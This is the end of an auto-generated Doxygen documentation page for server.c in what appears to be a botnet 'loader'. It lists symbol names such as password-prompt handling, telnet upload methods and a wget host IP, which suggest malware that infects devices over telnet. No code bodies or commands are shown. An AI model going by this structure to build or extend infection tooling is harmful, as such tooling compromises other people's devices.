<div class="ttc" id="connection_8c_html_ac38d0bc660e02d86ce1dff3855004c09"><div class="ttname"><a href="connection_8c.html#ac38d0bc660e02d86ce1dff3855004c09">connection_consume_iacs</a></div><div class="ttdeci">int connection_consume_iacs(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00087">connection.c:87</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a66c32fe2ced559e246bb8a27ac57cd0e"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a></div><div class="ttdeci">#define ATOMIC_INC(ptr)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00020">includes.h:20</a></div></div>
<div class="ttc" id="connection_8c_html_a509389938f76d6277ffdb912ca8b4283"><div class="ttname"><a href="connection_8c.html#a509389938f76d6277ffdb912ca8b4283">connection_consume_password_prompt</a></div><div class="ttdeci">int connection_consume_password_prompt(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00182">connection.c:182</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_a993f1d32fc9cf3ab12b313462da9dd57"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#a993f1d32fc9cf3ab12b313462da9dd57">ATOMIC_DEC</a></div><div class="ttdeci">#define ATOMIC_DEC(ptr)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00021">includes.h:21</a></div></div>
<div class="ttc" id="structbinary_html"><div class="ttname"><a href="structbinary.html">binary</a></div><div class="ttdef"><b>Definition:</b> <a href="binary_8h_source.html#l00007">binary.h:7</a></div></div>
<div class="ttc" id="connection_8c_html_a1cabdc0c7a73b41b2e51e515f61bf5db"><div class="ttname"><a href="connection_8c.html#a1cabdc0c7a73b41b2e51e515f61bf5db">connection_consume_mounts</a></div><div class="ttdeci">int connection_consume_mounts(struct connection *conn)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00351">connection.c:351</a></div></div>
<div class="ttc" id="server_8c_html_a2cf30fe0bab904fee00364d90af96a01"><div class="ttname"><a href="server_8c.html#a2cf30fe0bab904fee00364d90af96a01">server_create</a></div><div class="ttdeci">struct server * server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)</div><div class="ttdef"><b>Definition:</b> <a href="server_8c_source.html#l00019">server.c:19</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html">includes.h</a></div></div>
<div class="ttc" id="structconnection_html_abcfdd1496a544cc512f998f1747f4727"><div class="ttname"><a href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">connection::rdbuf</a></div><div class="ttdeci">uint8_t rdbuf[8192]</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00043">connection.h:43</a></div></div>
<div class="ttc" id="structserver_html_a33515ab0c529621ecc5d317770637cb2"><div class="ttname"><a href="structserver.html#a33515ab0c529621ecc5d317770637cb2">server::workers</a></div><div class="ttdeci">struct server_worker * workers</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00013">server.h:13</a></div></div>
<div class="ttc" id="structconnection_html_a73be799c1ca19234b30e96e2f06caa16a105b1b97096fc45bc18b386bd82c394e"><div class="ttname"><a href="structconnection.html#a73be799c1ca19234b30e96e2f06caa16a105b1b97096fc45bc18b386bd82c394e">connection::TELNET_UPLOAD_METHODS</a></div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00030">connection.h:30</a></div></div>
<div class="ttc" id="structserver_html_a3429acc7dc3373cd09b6b10348ae41e6"><div class="ttname"><a href="structserver.html#a3429acc7dc3373cd09b6b10348ae41e6">server::wget_host_ip</a></div><div class="ttdeci">char * wget_host_ip</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00012">server.h:12</a></div></div>
<div class="ttc" id="structserver_html_a712c73b78adff8b0f9d0c824d87eb2c1"><div class="ttname"><a href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">server::estab_conns</a></div><div class="ttdeci">struct connection ** estab_conns</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00014">server.h:14</a></div></div>
<div class="ttc" id="structconnection_html_abac1a18cec875d1264fdfa4ffd95c4f7"><div class="ttname"><a href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">connection::output_buffer</a></div><div class="ttdeci">struct connection::@1 output_buffer</div></div>
</div><!-- fragment --></div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_4d1b2d0cbfbe3c7e279f07c0f553de4a.html">loader</a></li><li class="navelem"><a class="el" href="dir_2772e0b00f08f6631187cc490dafe1e0.html">src</a></li><li class="navelem"><a class="el" href="server_8c.html">server.c</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
